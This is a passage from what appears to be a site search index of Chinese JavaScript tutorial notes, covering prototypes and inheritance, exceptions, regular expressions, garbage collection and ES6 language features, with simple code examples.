constructor\",\"slug\":\"_4-3-constructor\",\"contents\":[\"proto里面有一个成员叫做 constructor，这个属性就是指向当前这个对象所属的构造函数\",\"使用场景：如果有多个对象的方法，我们可以给原型对象采取对象形式赋值，但是这样就会覆盖构造函数原型对象原来的内容，这样修改后的原型对象 constructor 就不再指向当前构造函数了，此时，我们可以在修改后的原型对象中，添加一个 constructor 指向原来的构造函数\",\"function Star(name){ this.name = name } Star.prototype = { sing:function(){console.log('唱歌')}, dance:function(){console.log('跳舞')} } console.log(Star.prototype.constructor) // 指向Object \",\"function Star(name){ this.name = name } Star.prototype = { //手动利用constructor指回Star构造函数 constructor:Star, sing:function(){console.log('唱歌')}, dance:function(){console.log('跳舞')} } console.log(Star.prototype.constructor) // 指向Star \",\"我们刚才聊过构造函数了，也聊了原型，那么问题出现了，我们说构造函数的 prototype 是一个对象，又说了每一个对象都天生自带一个 __proto__ 属性，那么 构造函数的 prototype 里面的 __proto__ 属性又指向哪里呢？\",\"__proto__里面也有一个成员叫做 constructor，这个属性就是指向当前这个对象所属的构造函数\",\"function Star() {} const ldh = new Star() //对象原型里面有constructor 指向构造函数 Star console.log(ldh.__proto__.constructor === Star) \"]},{\"header\":\"5. 原型链\",\"slug\":\"_5-原型链\",\"contents\":[]},{\"header\":\"5.1 链状结构\",\"slug\":\"_5-1-链状结构\",\"contents\":[\"当一个对象我们不知道准确的是谁构造的时候，我们呢就把它看成 Object 的实例化对象，也就是说，我们的 构造函数 的 prototype 的 __proto__ 指向的是 Object.prototype\",\"那么 Object.prototype 也是个对象，那么它的 __proto__ 又指向谁呢？因为 Object 是 JS 中的顶级构造函数，我们有一句话叫 万物皆对象，所以 Object.prototype 就到顶了，Object.prototype 的 __proto__ 就是 null\",\"JavaScript-面向对象编程01.png\",\" function Person() { } const xm = new Person() console.log(xm.__proto__ === Person.prototype) //true console.log(Person.prototype.__proto__ === Object.prototype) //true console.log(xm instanceof Person) //true console.log(xm instanceof Object) //true console.log(xm instanceof Array) //false console.log([1, 2, 3] instanceof Array) //true console.log(Array instanceof Object) //true \"]},{\"header\":\"5.2 原型链的访问原则\",\"slug\":\"_5-2-原型链的访问原则\",\"contents\":[\"当访问一个对象的属性（包括方法）时，首先查找这个对象自身有没有该属性\",\"如果没有就查找它的原型（也就是 __proto__ 指向的 prototype 原型对象）\",\"如果还没有就查找原型对象的原型（Object 的原型对象）\",\"依此类推一直找到 Object 为止（null）\",\"__proto__ 对象原型的意义就在于为对象成员查找机制提供一个方向，或者说一条路线\",\"可以使用 instanceof 运算符来检测构造函数的 prototype 属性是否出现在某个实例对象的原型链上\"]},{\"header\":\"6. 对象的赋值\",\"slug\":\"_6-对象的赋值\",\"contents\":[\"到这里，我们就会觉得，如果是赋值的话，那么也会按照原型链的规则来，但是： 并不是！并不是！并不是！ 重要的事情说三遍\",\"赋值的时候，就是直接给对象自己本身赋值，如果原先有就是修改，原先没有就是添加，不会和 __proto__ 有关系\"]},{\"header\":\"7. 继承\",\"slug\":\"_7-继承\",\"contents\":[]},{\"header\":\"7.1 构造函数继承\",\"slug\":\"_7-1-构造函数继承\",\"contents\":[\"function Student(name,age,classroom){ Person.call(this,name,age) this.classroom = classroom } \"]},{\"header\":\"7.2 原型继承\",\"slug\":\"_7-2-原型继承\",\"contents\":[\"Student.prototype = new Person() \"]},{\"header\":\"7.3 组合继承\",\"slug\":\"_7-3-组合继承\",\"contents\":[\"构造函数继承+原型继承\",\"function Person(name,age){ this.name = name this.age = age } Person.prototype.say = function(){ console.log(\\\"hello\\\") } function Student(name,age,classroom){ Person.call(this,name,age) this.classroom = classroom } Student.prototype = new Person() var obj = new Student(\\\"kerwin\\\",100,\\\"1班\\\") \"]}]},\"/front-end/javascript-notes/23-JavaScript-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86.html\":{\"title\":\"异常处理\",\"contents\":[{\"header\":\"1. throw\",\"slug\":\"_1-throw\",\"contents\":[\"异常处理是指预估代码执行过程中可能发生的错误，然后最大程度的避免错误的发生导致整个程序无法继续运行\",\"总结：\",\"throw 抛出异常信息，程序也会终止执行\",\"throw 后面跟的是错误提示信息\",\"Error 对象配合 throw 使用，能够设置更详细的错误信息\",\"<script> function counter(x, y) { if(!x || !y) { // throw '参数不能为空!'; throw new Error('参数不能为空!') } return x + y } counter() </script> \"]},{\"header\":\"2. try...catch\",\"slug\":\"_2-try-catch\",\"contents\":[\"<script> function foo() { try { // 查找 DOM 节点 const p = document.querySelector('.p') p.style.color = 'red' } catch (error) { // try 代码段中执行有错误时，会执行 catch 代码段 // 查看错误信息 console.log(error.message) // 终止代码继续执行 return } finally { alert('执行') } console.log('如果出现错误，我的语句不会执行') } foo() </script> \",\"总结：\",\"try...catch 用于捕获错误信息\",\"将预估可能发生错误的代码写在 try 代码段中\",\"如果 try 代码段中出现错误后，会执行 catch 代码段，并截获到错误信息\",\"finally 不管是否有错误，都会执行\"]},{\"header\":\"3. debugger\",\"slug\":\"_3-debugger\",\"contents\":[\"相当于断点调试\"]}]},\"/front-end/javascript-notes/24-JavaScript-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html\":{\"title\":\"正则表达式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"正则表达式（Regular Expression）是一种字符串匹配的模式（规则）\",\"使用场景：\",\"通常用来提取、匹配、替换那些符合正则表达式的文本 \",\"例如验证表单：手机号表单要求用户只能输入11位的数字 (匹配)\",\"过滤掉页面内容中的一些敏感词 (替换)\",\"从字符串中获取我们想要的特定部分 (提取)\"]},{\"header\":\"1. 正则基本使用\",\"slug\":\"_1-正则基本使用\",\"contents\":[]},{\"header\":\"1.1 定义规则\",\"slug\":\"_1-1-定义规则\",\"contents\":[\"var 变量名 = /表达式/ \",\"其中 / / 是正则表达式字面量\",\"正则表达式也是对象 \",\"比如：\",\"var reg = /前端/ \"]},{\"header\":\"1.2 判断是否有符合规则的字符串\",\"slug\":\"_1-2-判断是否有符合规则的字符串\",\"contents\":[\"test() 方法用来查看正则表达式与指定的字符串是否匹配\",\"如果正则表达式与指定的字符串匹配，返回 true，否则返回 false\",\"语法：\",\"正则表达式对象.test(被检测的字符串) \",\"<body> <script> // 正则表达式的基本使用 var str = 'web前端开发' // 1. 定义规则 var reg = /web/ // 2. 使用正则 test() console.log(reg.test(str)) // true 如果符合规则匹配上则返回true console.log(reg.test('java开发')) // false 如果不符合规则匹配上则返回 false </script> </body> \"]},{\"header\":\"1.3 检索(查找)符合规则的字符串\",\"slug\":\"_1-3-检索-查找-符合规则的字符串\",\"contents\":[\"exec() 方法用于在一个指定字符串中执行一个搜索匹配\",\"如果匹配成功，exec() 方法返回一个数组，否则返回 null\",\"语法：\",\"正则表达式对象.exec(被检测的字符串) \"]},{\"header\":\"1.4 替换符合规则的字符串\",\"slug\":\"_1-4-替换符合规则的字符串\",\"contents\":[\"replace() 方法用于替换字符串\",\"语法：\",\"字符串.replace(/正则表达式/,'替换的文本') \"]},{\"header\":\"2. 元字符\",\"slug\":\"_2-元字符\",\"contents\":[\"普通字符: \",\"大多数的字符仅能够描述它们本身，这些字符称作普通字符，例如所有的字母和数字\",\"普通字符只能够匹配字符串中与它们相同的字符\",\"比如，规定用户只能输入英文26个英文字母，普通字符的话 /[abcdefghijklmnopqrstuvwxyz]/\",\"元字符 (特殊字符） \",\"是一些具有特殊含义的字符，可以极大提高了灵活性和强大的匹配功能\",\"比如，规定用户只能输入英文26个英文字母，换成元字符写法：/[a-z]/\"]},{\"header\":\"2.1 边界符\",\"slug\":\"_2-1-边界符\",\"contents\":[\"正则表达式中的边界符（位置符）用来提示字符所处的位置，主要有两个字符\",\"边界符\",\"说明\",\"^\",\"表示匹配行首的文本（以谁开始）\",\"$\",\"表示匹配行尾的文本（以谁结束）\",\"如果 ^ 和 $ 在一起，表示必须是精确匹配\",\"<body> <script> // 元字符之边界符 // 1. 匹配开头的位置 ^ var reg = /^web/ console.log(reg.test('web前端')) // true console.log(reg.test('前端web')) // false console.log(reg.test('前端web学习')) // false console.log(reg.test('we')) // false // 2. 匹配结束的位置 $ var reg1 = /web$/ console.log(reg1.test('web前端')) // false console.log(reg1.test('前端web')) // true console.log(reg1.test('前端web学习')) // false console.log(reg1.test('we')) // false // 3. 精确匹配 ^ $ var reg2 = /^web$/ console.log(reg2.test('web前端')) // false console.log(reg2.test('前端web')) // false console.log(reg2.test('前端web学习')) // false console.log(reg2.test('we')) // false console.log(reg2.test('web')) // true console.log(reg2.test('webweb')) // flase </script> </body> \"]},{\"header\":\"2.2 量词\",\"slug\":\"_2-2-量词\",\"contents\":[\"量词用来设定某个模式重复次数\",\"量词\",\"说明\",\"*\",\"重复零次或更多次\",\"+\",\"重复一次或更多次\",\"?\",\"重复零次或一次\",\"{n}\",\"重复 n 次\",\"{n,}\",\"重复 n 次或更多次\",\"{n,m}\",\"重复 n 到 m 次\",\"注意： 逗号左右两侧千万不要出现空格\",\"<body> <script> // 元字符之量词 // 1. * 重复次数 >= 0 次 var reg1 = /^w*$/ console.log(reg1.test('')) // true console.log(reg1.test('w')) // true console.log(reg1.test('ww')) // true console.log('-----------------------') // 2. + 重复次数 >= 1 次 var reg2 = /^w+$/ console.log(reg2.test('')) // false console.log(reg2.test('w')) // true console.log(reg2.test('ww')) // true console.log('-----------------------') // 3. ? 重复次数 0 || 1 var reg3 = /^w?$/ console.log(reg3.test('')) // true console.log(reg3.test('w')) // true console.log(reg3.test('ww')) // false console.log('-----------------------') // 4. {n} 重复 n 次 var reg4 = /^w{3}$/ console.log(reg4.test('')) // false console.log(reg4.test('w')) // flase console.log(reg4.test('ww')) // false console.log(reg4.test('www')) // true console.log(reg4.test('wwww')) // false console.log('-----------------------') // 5. {n,} 重复次数 >= n var reg5 = /^w{2,}$/ console.log(reg5.test('')) // false console.log(reg5.test('w')) // false console.log(reg5.test('ww')) // true console.log(reg5.test('www')) // true console.log('-----------------------') // 6. {n,m} n =< 重复次数 <= m var reg6 = /^w{2,4}$/ console.log(reg6.test('w')) // false console.log(reg6.test('ww')) // true console.log(reg6.test('www')) // true console.log(reg6.test('wwww')) // true console.log(reg6.test('wwwww')) // false // 7. 注意事项： 逗号两侧千万不要加空格否则会匹配失败 </script> \"]},{\"header\":\"2.3 字符集合\",\"slug\":\"_2-3-字符集合\",\"contents\":[\"[abc] 匹配包含的单个字符，也就是只有 a 或 b 或 c 这三个单字符则返回 true，可以理解为多选一\",\"[a-z]- 是连字符，用来指定字符范围，[a-z] 表示匹配 a 到 z 这26 个英文字母\",\"[^abc]^ 是取反符，[^abc] 表示匹配除了小写字母以外的字符\",\"[a-zA-Z] 表示匹配大小写字母\",\"[0-9] 表示匹配 0~9 的数字\",\". 表示匹配除换行符之外的任何单个字符\",\"<body> <script> // 元字符之范围 [] // 1. [abc] 匹配包含的单个字符， 多选1 var reg1 = /^[abc]$/ console.log(reg1.test('a')) // true console.log(reg1.test('b')) // true console.log(reg1.test('c')) // true console.log(reg1.test('d')) // false console.log(reg1.test('ab')) // false // 2. [a-z] 连字符 单个 var reg2 = /^[a-z]$/ console.log(reg2.test('a')) // true console.log(reg2.test('p')) // true console.log(reg2.test('0')) // false console.log(reg2.test('A')) // false // 想要包含小写字母，大写字母 ，数字 var reg3 = /^[a-zA-Z0-9]$/ console.log(reg3.test('B')) // true console.log(reg3.test('b')) // true console.log(reg3.test(9)) // true console.log(reg3.test(',')) // flase // 用户名可以输入英文字母，数字，可以加下划线，要求 6~16位 var reg4 = /^[a-zA-Z0-9_]{6,16}$/ console.log(reg4.test('abcd1')) // false console.log(reg4.test('abcd12')) // true console.log(reg4.test('ABcd12')) // true console.log(reg4.test('ABcd12_')) // true // 3. [^a-z] 取反符 var reg5 = /^[^a-z]$/ console.log(reg5.test('a')) // false console.log(reg5.test('A')) // true console.log(reg5.test(8)) // true </script> </body> \"]},{\"header\":\"2.4 常见模式的简写\",\"slug\":\"_2-4-常见模式的简写\",\"contents\":[\"某些常见模式的简写方式，区分字母和数字\",\"预定类\",\"说明\",\"\\\\d\",\"匹配 0~9 之间的任一数字，相当于 [0-9]\",\"\\\\D\",\"匹配一个非数字字符，相当于 [^0-9]\",\"\\\\w\",\"匹配任意的字母、数字和下划线，相当于 [A-Za-z0-9_]\",\"\\\\W\",\"匹配除所有字母、数字和下划线以外的字符，相当于 [^A-Za-z0-9_]\",\"\\\\s\",\"匹配空格（包括换行符、制表符、空格符等），相当于 [\\\\t\\\\r\\\\n\\\\v\\\\f]\",\"\\\\S\",\"匹配非空格的字符，相当于 [^\\\\t\\\\r\\\\n\\\\v\\\\f]\",\"如：日期格式：^\\\\d{4}-\\\\d{1,2}-\\\\d{1,2}\"]},{\"header\":\"3. 修饰符\",\"slug\":\"_3-修饰符\",\"contents\":[\"语法：\",\"/表达式/修饰符 \",\"i 是单词 ignore 的缩写，正则匹配时字母不区分大小写\",\"g 是单词 global 的缩写，匹配所有满足正则表达式的结果\",\"<body> <script> // 修饰符 var str = '欢迎大家学习前端，相信大家一定能学好前端，都成为前端大神' // 1. 替换 replace 需求：把前端替换为 web // 1.1 replace 返回值是替换完毕的字符串 // var strEnd = str.replace(/前端/, 'web') 只能替换一个 // 2. 修饰符 g 全部替换 var strEnd = str.replace(/前端/g, 'web') console.log(strEnd) </script> </body> \"]}]},\"/front-end/javascript-notes/25-JavaScript-%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6.html\":{\"title\":\"垃圾回收机制\",\"contents\":[{\"header\":\"1. 什么是垃圾回收机制\",\"slug\":\"_1-什么是垃圾回收机制\",\"contents\":[\"垃圾回收机制（Garbage Collection）简称 GC\",\"JavaScript 中内存的分配和回收都是自动完成的，内存在不使用的时候会被垃圾回收器自动回收，如果不再用到的内存没有及时释放，则会产生内存泄漏\"]},{\"header\":\"2. 内存的生命周期\",\"slug\":\"_2-内存的生命周期\",\"contents\":[\"JavaScript 环境中分配的内存，一般有如下生命周期：\",\"内存分配：当我们声明变量、函数、对象的时候，系统会自动为它们分配内存\",\"内存使用：即读写内存，也就是使用变量、函数等\",\"内存回收：使用完毕，由垃圾回收器自动回收不再使用的内存\",\"说明：\",\"全局变量一般不会回收（关闭页面回收）\",\"一般情况下局部变量的值不用了，会被自动回收掉\"]},{\"header\":\"3. 垃圾回收算法\",\"slug\":\"_3-垃圾回收算法\",\"contents\":[]},{\"header\":\"3.1 引用计数\",\"slug\":\"_3-1-引用计数\",\"contents\":[\"定义“内存不再使用”，就是看一个对象是否有指向它的引用，没有引用了就回收对象\",\"算法：\",\"跟踪记录被引用的次数\",\"如果被引用了一次，那么就记录次数 1，多次引用会累加\",\"如果减少一个引用就减一\",\"如果引用次数是 0，则释放内存\",\"存在问题： 嵌套引用（循环引用），如果两个对象相互引用，尽管他们已不再使用，垃圾回收器不会进行回收，导致内存泄漏\"]},{\"header\":\"3.2 标记清除法\",\"slug\":\"_3-2-标记清除法\",\"contents\":[\"现代浏览器大多使用该方法\",\"算法：标记清除法将“不再使用的对象”定义为“无法到达的对象”，就是从根部出发定时扫描内存中的对象。凡是能从根部到达的对象，都是还需要使用的，那些无法由根部出发触及到的对象被标记为不再使用，稍后进行回收\"]}]},\"/front-end/javascript-notes/26-JavaScript-ES6~ES13.html\":{\"title\":\"ES6~ES13\",\"contents\":[{\"header\":\"1. ES6\",\"slug\":\"_1-es6\",\"contents\":[]},{\"header\":\"1. 初识ES6\",\"slug\":\"_1-初识es6\",\"contents\":[\"ECMAScript 6.0（以下简称 ES6）是 JavaScript 语言的下一代标准，已经在 2015 年 6 月正式发布了。它的目标，是使得 JavaScript 语言可以用来编写复杂的大型应用程序，成为企业级开发语言\",\"1997年：ECMAScript 1.0\",\"1998年：ECMAScript 2.0\",\"1999年：ECMAScript 3.0\",\"2006年：ECMAScript 4.0 未通过\",\"2009年：ECMAScript 5.0\",\"2015年：ECMAScript 6.0\",\"至今，版本号改用年号的形式\"]},{\"header\":\"2. let和const关键字\",\"slug\":\"_2-let和const关键字\",\"contents\":[\"我们以前都是使用 var 关键字来声明变量的，在 ES6 的时候，多了两个关键字 let 和 const，也是用来声明变量的\",\"let、const与var的区别：\",\"let 和 const 不允许重复声明变量\",\"// 使用 var 的时候重复声明变量是没问题的，只不过就是后面会把前面覆盖掉 var num = 100; var num = 200; \",\"// 使用 let 重复声明变量的时候就会报错了 let num = 100; let num = 200; // 这里就会报错了 \",\"// 使用 const 重复声明变量的时候就会报错 const num = 100; const num = 200; // 这里就会报错了 \",\"let 和 const 声明的变量不会在预解析的时候解析（也就是没有变量提升）\",\"// 因为预解析（变量提升）的原因，在前面是有这个变量的，只不过没有赋值 console.log(num); // undefined var num = 100; \",\"// 因为 let 不会进行预解析（变量提升），所以直接报错了 console.log(num); // 这里就会报错了 let num = 100; \",\"// 因为 const 不会进行预解析（变量提升），所以直接报错了 console.log(num); // 这里就会报错了 const num = 100; \",\"let 和 const 声明的变量会被所有代码块限制作用范围\",\"// var 声明的变量只有函数能限制其作用域，其他的不能限制 if (true) { var num = 100; } console.log(num); // 100 \",\"// let 声明的变量，除了函数可以限制，所有的代码块都可以限制其作用域（if/while/for/...） if (true) { let num = 100; console.log(num); // 100 } console.log(num); // 报错 \",\"// const 声明的变量，除了函数可以限制，所有的代码块都可以限制其作用域（if/while/for/...） if (true) { const num = 100; console.log(num); // 100 } console.log(num); // 报错 \",\"let 和 const 的区别：\",\"let 声明的变量的值可以改变，const 声明的变量的值不可以改变\",\"let num = 100; num = 200; console.log(num); // 200 \",\"const num = 100; num = 200; // 这里就会报错了，因为 const 声明的变量值不可以改变（我们也叫做常量） \",\"let 声明的时候可以不赋值，const 声明的时候必须赋值，建议使用 const 来声明数组和对象\",\"let num; num = 100; console.log(num); // 100 \",\"const num; // 这里就会报错了，因为 const 声明的时候必须赋值 \"]},{\"header\":\"3. 展开运算符\",\"slug\":\"_3-展开运算符\",\"contents\":[\"ES6 里面号新添加了一个运算符 ... ，叫做展开运算符\",\"作用：\",\"把数组展开，不会修改原数组\",\"let arr = [1, 2, 3, 4, 5]; console.log(...arr); // 1 2 3 4 5 \",\"合并数组的时候可以使用\",\"let arr = [1, 2, 3, 4]; let arr2 = [...arr, 5]; console.log(arr2); \",\"也可以合并对象使用\",\"let obj = { name: 'Jack', age: 18 }; let obj2 = { ...obj, gender: '男' }; console.log(obj2); \",\"在函数传递参数的时候也可以使用\",\"let arr = [1, 2, 3]; function fn(a, b, c) { console.log(a); console.log(b); console.log(c); } fn(...arr); // 等价于 fn(1, 2, 3) \"]},{\"header\":\"4. 解构赋值\",\"slug\":\"_4-解构赋值\",\"contents\":[\"解构赋值，就是快速的从对象或者数组中取出成员的一个语法方式\"]},{\"header\":\"1. 数组解构\",\"slug\":\"_1-数组解构\",\"contents\":[\"快速的从数组中获取成员\",\"// ES5 的方式从数组中获取成员 const arr = [1, 2, 3]; let a = arr[0]; let b = arr[1]; let c = arr[2]; console.log(a); // 1 console.log(b); // 2 console.log(c); // 3 \",\"// 使用解构赋值的方式从数组中获取成员 const arr = [1, 2, 3]; // 前面的 [] 表示要从 arr 这个数组中获取成员 // a b c 分别对应这数组中的索引 0 1 2 // arr 必须是一个数组 let [a, b, c] = arr; console.log(a); // 1 console.log(b); // 2 console.log(c); // 3 \",\"// 数组解构的典型应用——交换两个变量的值 let a = 1; let b = 2; [a,b] = [b,a]; console.log(a,b); //2 1 \",\"//数组解构的一些特殊情况——变量多，单元值少 const [a,b,c,d] = [1,2,3]; console.log(a,b,c,d); //1 2 3 undefined //为此防止有undefined传递单元值的情况，可以设置默认值 const [x=0,y=0] = [1]; console.log(x); //1 console.log(y); //0 \",\"//数组解构的一些特殊情况——变量少，单元值多 const [a,b,...c] = [1,2,3,4,5]; console.log(a); //1 console.log(b); //2 console.log(c); //[3,4,5] //为此可以按需导入赋值 const [x,y,,z] = [1,2,3,4]; console.log(x,y,z); //1 2 4 \",\"总结：\",\"赋值运算符 = 左侧的 [] 用于批量声明变量，右侧数组的单元值将被赋值给左侧的变量\",\"变量的顺序对应数组单元值的位置依次进行赋值操作\",\"变量的数量大于单元值数量时，多余的变量将被赋值为 undefined\",\"变量的数量小于单元值数量时，可以通过 ... 获取剩余单元值，但只能置于最末位\",\"允许初始化变量的默认值，且只有单元值为 undefined 时默认值才会生效\",\"数组解构也支持多维解构赋值\"]},{\"header\":\"2. 对象解构\",\"slug\":\"_2-对象解构\",\"contents\":[\"快速的从对象中获取成员\",\"// ES5 的方法获取对象中的成员 const obj = { name: 'Jack', age: 18, gender: '男' }; let name = obj.name; let age = obj.age; let gender = obj.gender; \",\"// 解构赋值的方式从对象中获取成员 const obj = { name: 'Jack', age: 18, gender: '男' }; // 前面的 {} 表示我要从 obj 这个对象中获取成员了 // name age gender 都得是 obj 中有的成员 // obj 必须是一个对象 let { name, age, gender } = obj; \",\"// 对象解构的一些语法注意点 // 对象解构的语法 const obj = { uname: '游戏', price: 58 }; const {uname,price} = {uname: '游戏', price: 58}; console.log(uname); //相当于uname = obj.uname console.log(price); //相当于price = obj.price // 解构的变量名必须与属性名一致 const {uname1,price1} = {uname: '游戏', price: 58}; console.log(uname1); //undefined console.log(price1); //undefined // 对象解构变量名更改 旧变量名:新变量名 const {uname:game,price:money} = {uname: '游戏', price: 58}; console.log(game); //游戏 console.log(money); //58 //数组对象解构 const arr = [{uname1: '游戏', price1: 58}]; const [{p,n}] = [{n: '游戏', p: 58}]; console.log(p); //58 console.log(n); //游戏 \",\"总结：\",\"赋值运算符 = 左侧的 {} 用于批量声明变量，右侧对象的属性值将被赋值给左侧的变量\",\"对象属性的值将被赋值给与属性名相同的变量\",\"对象中找不到与变量名一致的属性时变量值为 undefined\",\"允许初始化变量的默认值，属性不存在或单元值为 undefined 时默认值才会生效\",\"对象解构也支持多维解构赋值\"]},{\"header\":\"5. 模版字符串\",\"slug\":\"_5-模版字符串\",\"contents\":[\"ES5 中我们表示字符串的时候使用 '' 或者 \\\"\\\"，在 ES6 中，我们还有一个东西可以表示字符串，就是``（反引号）\",\"let str = `hello world`; console.log(typeof str); // string \",\"反引号与单引号、双引号的区别：\",\"反引号可以换行书写\",\"// 这个单引号或者双引号不能换行，换行就会报错了 let str = 'hello world'; // 下面这个就报错了 let str2 = 'hello world'; \",\"let str = ` hello world `; console.log(str); // 是可以使用的 \",\"反引号可以直接在字符串里面拼接变量\",\"// ES5 需要字符串拼接变量的时候 let num = 100; let str = 'hello' + num + 'world' + num; console.log(str); // hello100world100 // 直接写在字符串里面不好使 let str2 = 'hellonumworldnum'; console.log(str2); // hellonumworldnum \",\"// 模版字符串拼接变量 let num = 100; let str = `hello${num}world${num}`; console.log(str); // hello100world100 \",\"里面的 ${} 就是用来书写变量的位置\"]},{\"header\":\"6. 字符串扩展\",\"slug\":\"_6-字符串扩展\",\"contents\":[]},{\"header\":\"1. includes函数\",\"slug\":\"_1-includes函数\",\"contents\":[\"判断字符串中是否存在指定字符\",\"let myname = \\\"kerwin\\\"; console.log(myname.includes(\\\"e\\\")); //true console.log(myname.includes(\\\"ker\\\")); //true console.log(myname.includes(\\\"en\\\")); //false \",\"可以传入第二个参数，表示按索引值位置开始查找\",\"let myname = \\\"kerwin\\\"; console.log(myname.includes(\\\"e\\\",1)); //true console.log(myname.includes(\\\"e\\\",3)); //false \"]},{\"header\":\"2. startsWith函数\",\"slug\":\"_2-startswith函数\",\"contents\":[\"判断字符串是否以某字符开头\",\"let myname = \\\"kerwin\\\"; console.log(myname.startsWith(\\\"k\\\")); //true console.log(myname.startsWith(\\\"ker\\\")); //true console.log(myname.startsWith(\\\"er\\\")); //false \",\"可以传入第二个参数，表示按索引值位置开始查找\",\"let myname = \\\"kerwin\\\"; console.log(myname.startsWith(\\\"k\\\",0)); //true console.log(myname.startsWith(\\\"k\\\",2)); //false \"]},{\"header\":\"3. endsWith函数\",\"slug\":\"_3-endswith函数\",\"contents\":[\"判断字符串是否以某字符结束\",\"let myname = \\\"kerwin\\\"; console.log(myname.endsWith(\\\"n\\\")); //true console.log(myname.endsWith(\\\"in\\\")); //true console.log(myname.endsWith(\\\"k\\\")); //false \",\"可以传入第二个参数，表示按索引值位置开始往前查找\",\"let myname = \\\"kerwin\\\"; console.log(myname.startsWith(\\\"n\\\",1)); //false console.log(myname.startsWith(\\\"n\\\",5)); //true \"]},{\"header\":\"4. repeat函数\",\"slug\":\"_4-repeat函数\",\"contents\":[\"repeat()方法返回一个新字符串,表示将原字符串重复n次\",\"let myname = \\\"kerwin\\\"; console.log(myname.repeat(3)); //kerwinkerwinkerwin console.log(myname.repeat(0)); //\\\"\\\" console.log(myname.repeat(3.5)); //kerwinkerwinkerwin console.log(myname.repeat(\\\"3\\\")); //kerwinkerwinkerwin \"]},{\"header\":\"7. 数值扩展\",\"slug\":\"_7-数值扩展\",\"contents\":[]},{\"header\":\"1. 进制表示法\",\"slug\":\"_1-进制表示法\",\"contents\":[\"//十进制 let count1 = 100; //十六进制 let count2 = 0x100; //八进制 let count3 = 0o100; //二进制 let count4 = 0b100; \"]},{\"header\":\"2. isFinite与isNaN方法\",\"slug\":\"_2-isfinite与isnan方法\",\"contents\":[\"减少全局性方法，使得语言逐步模块化\",\"let num1 = Number.isFinite(100); console.log(num1); //true let num2 = Number.isFinite(100/0); console.log(num2); //false let num3 = Number.isFinite(Infinity); console.log(num3); // false let num4 = Number.isFinite(\\\"100\\\"); console.log(num4); //false \",\"let num1 = Number.isNaN(100); console.log(num1); // false let num2 = Number.isNaN(NaN); console.log(num2); //true let num3 = Number.isNaN(\\\"kerwin\\\"); console.log(num3); //false let num4 = Number.isNaN(\\\"100\\\"); console.log(num4); // false \",\"它们与传统的全局方法isFinite()和isNaN()的区别在于，传统方法先调用Number()将非数值的值转为数值，再进行判断，而这两个新方法只对数值有效，Number.isFinite()对于非数值一律返回false, Number.isNaN()只有对于NaN才返回true，非NaN一律返回false\"]},{\"header\":\"3. isInteger方法\",\"slug\":\"_3-isinteger方法\",\"contents\":[\"用来判断一个数值是否为整数\",\"let num1 = Number.isInteger(100); console.log(num1); //true let num2 = Number.isInteger(100.0); console.log(num2); //true let num3 = Number.isInteger(\\\"kerwin\\\"); console.log(num3); //false let num4 = Number.isInteger(\\\"100\\\"); console.log(num4); //false let num5 = Number.isInteger(100.1); console.log(num5); //false \"]},{\"header\":\"4. 极小常量Number.EPSILON\",\"slug\":\"_4-极小常量number-epsilon\",\"contents\":[\"它表示 1 与大于 1 的最小浮点数之间的差。2.220446049250313e-16\",\"function isEqual(a,b){ return Math.abs(a-b)<Number.EPSILON; } console.log(isEqual(0.1+0.2,0.3)); //true console.log(0.1+0.2===0.3); //false \"]},{\"header\":\"5. Math.trunc\",\"slug\":\"_5-math-trunc\",\"contents\":[\"将小数部分抹掉,返回一个整数\",\"console.log(Math.trunc(1.2)); //1 console.log(Math.trunc(1.8)); // 1 console.log(Math.trunc(-1.8)); //-1 console.log(Math.trunc(-1.2)); //-1 \"]},{\"header\":\"6. Math.sign\",\"slug\":\"_6-math-sign\",\"contents\":[\"Math.sign方法用来判断一个数到底是正数、负数、还是零。对于非数值，会先将其转换为数值\",\"Math.sign(-100); // -1 Math.sign(100); // +1 Math.sign(0); // +0 Math.sign(-0); // -0 Math.sign(\\\"kerwin\\\"); // NaN \"]},{\"header\":\"8. 数组扩展\",\"slug\":\"_8-数组扩展\",\"contents\":[]},{\"header\":\"1. Array.from\",\"slug\":\"_1-array-from\",\"contents\":[\"将类数组对象转换为真正数组\",\"function test(){ console.log(Array.from(arguments)); } test(1,2,3); // [1,2,3] \"]},{\"header\":\"2. Array.of\",\"slug\":\"_2-array-of\",\"contents\":[\"将一组值转化为数组，即新建数组\",\"let arr1 = Array(3); console.log(arr1); // [,,] let arr2 = Array.of(3); console.log(arr2); // [3] \"]},{\"header\":\"3. find方法\",\"slug\":\"_3-find方法\",\"contents\":[\"该方法主要应用于查找第一个符合条件的数组元素\",\"它的参数是一个回调函数。在回调函数中可以写你要查找元素的条件，当条件成立为true时，返回该元素；如果没有符合条件的元素，返回值为undefined\",\"let arr = [11,12,13,14,15]; let res1 = arr.find(function(item){ return item>13; }); let res2 = arr.findIndex(function(item){ return item>13; }); console.log(res1); //14 console.log(res2); //3 //findLast() findLastIndex() ES2022 let arr2 = [11,12,13,14,15]; let res3 = arr.findLast(function(item){ return item>13; }); let res4 = arr.findLastIndex(function(item){ return item>13; }); console.log(res3); //15 console.log(res4); //4 \"]},{\"header\":\"4. fill方法\",\"slug\":\"_4-fill方法\",\"contents\":[\"使用自己想要的参数替换原数组内容，但是会改变原来的数组\",\"let arr1 = new Array(3).fill(\\\"kerwin\\\"); let arr2 = ['a', 'b', 'c'].fill(\\\"kerwin\\\", 1, 2); console.log(arr1); //['kerwin', 'kerwin', 'kerwin'] console.log(arr2); // ['a', 'kerwin', 'c'] \"]},{\"header\":\"5. flat与flatMap方法\",\"slug\":\"_5-flat与flatmap方法\",\"contents\":[\"按照一个可指定的深度递归遍历数组，并将所有元素与遍历到的子数组中的元素合并为一个新数组返回\",\"let arr = [1,2,3,[4,5,6]]; let arr1 = arr.flat(); console.log(arr,arr1); //[1,2,3,4,5,6] var obj = [{ name: \\\"A\\\", list: [\\\"鞍山\\\", \\\"安庆\\\", \\\"安阳\\\"] }, { name: \\\"B\\\", list: [\\\"北京\\\", \\\"保定\\\", \\\"包头\\\"] } ]; console.log(obj.flatMap(function(item){ return item.list })); // ['鞍山', '安庆', '安阳', '北京', '保定', '包头'] \"]},{\"header\":\"9. 对象扩展\",\"slug\":\"_9-对象扩展\",\"contents\":[]},{\"header\":\"1. 对象简写\",\"slug\":\"_1-对象简写\",\"contents\":[\"//原写法 let name =\\\"moduleA\\\"; let obj = { name:name, 